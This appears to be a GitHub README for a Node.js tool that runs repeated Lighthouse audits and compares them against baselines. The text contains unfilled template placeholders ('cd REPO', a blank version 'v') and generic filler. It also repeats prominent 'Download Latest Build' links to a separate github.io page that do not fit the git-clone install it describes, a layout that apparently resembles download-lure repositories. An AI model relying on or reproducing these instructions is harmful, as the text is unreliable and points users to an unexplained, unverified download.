# PageSpeed Compare - performance monitoring tool 2026

> **PageSpeed Compare is a Node.js performance monitoring utility that executes Lighthouse audits, lines them up with baselines, and presents the results in readable reports for ongoing site checks.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adamsethan2004/pagespeed-compare-monitor?style=flat-square)](https://github.com/adamsethan2004/pagespeed-compare-monitor)

---

<p align="center">
  <a href="https://adamsethan2004.github.io/pagespeed-compare-monitor/">
    <img src="https://img.shields.io/badge/Download-PageSpeed%20Compare%20Latest-brightgreen?style=for-the-badge" alt="Download PageSpeed Compare">
  </a>
</p>

> **[Direct Download - PageSpeed Compare v](https://adamsethan2004.github.io/pagespeed-compare-monitor/)**

---

[Download Latest Build](https://adamsethan2004.github.io/pagespeed-compare-monitor/)

---

## What PageSpeed Compare Does

PageSpeed Compare is designed to make Lighthouse-based performance tracking repeatable. It can run several tests for the same URL, roll those measurements into a summary, and then compare the new data against an earlier baseline so you can notice shifts in key metrics without manually reviewing every run.

It suits teams that want a simple workflow for pagespeed analysis, HTML output, and scheduled verification. Because it supports both one-off URL checks and multi-URL testing, it works well for focused debugging as well as wider monitoring jobs.

---

## Key Capabilities

- Performs several Lighthouse runs per URL and averages the results
- Checks new measurements against stored baseline values
- Watches score movement across time so performance changes stand out
- Generates HTML reports with color-coded metric displays
- Works with GitHub Actions for automated scheduled execution
- Handles a single URL or a complete URL list
- Keeps pagespeed and performance metrics at the center of the workflow
- Runs as a Node.js CLI for local use and automation

---

## Installation

Get the repository and install dependencies in your Node.js environment:

```bash
git clone https://github.com/adamsethan2004/pagespeed-compare-monitor.git
cd REPO
npm install
```

Once installed, launch the CLI from the project root with the entry command defined in the repository. If you are using GitHub Actions, you can also use the scheduled workflow for hands-off checks.

---

## Usage

Use a single URL when you need a narrow Lighthouse comparison:

```bash
node index.js https://example.com
```

Run the whole URL set when you want to compare a larger collection of pages:

```bash
node index.js
```

Typical workflow:
1. Choose the pages you want to watch.
2. Store or reuse a baseline for comparison.
3. Run Lighthouse tests multiple times for each URL.
4. Inspect the generated HTML report.
5. Repeat on a schedule to follow score changes.

---

## Configuration

Configuration is usually maintained in the project files that drive the CLI and the workflow setup. In day-to-day use, you will generally manage:

- the URL or URL list to test
- baseline data used for comparisons
- report output settings
- GitHub Actions schedule details

If you adapt the tool for your own process, keep these values in the repository configuration or in the workflow file used for automation.

---

## Requirements

- Node.js runtime
- Lighthouse available through the project setup
- A project workspace with access to the URLs you want to test
- Enough storage for generated reports and comparison data
- GitHub account and Actions support if you want automation

---

## FAQ

**How do I test just one page?**  
Run the CLI with a single URL to focus on that page and its current performance state.

**Can I compare against earlier results?**  
Yes. The tool is intended to compare current measurements with saved baselines.

**Is scheduled monitoring supported?**  
Yes. You can use GitHub Actions to run checks repeatedly over time.

**Where are the results stored?**  
The tool creates HTML reports that summarize the collected metrics and comparisons.

**What if the scores vary from run to run?**  
That is normal with repeated Lighthouse testing. Multiple runs are averaged to make changes easier to review.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
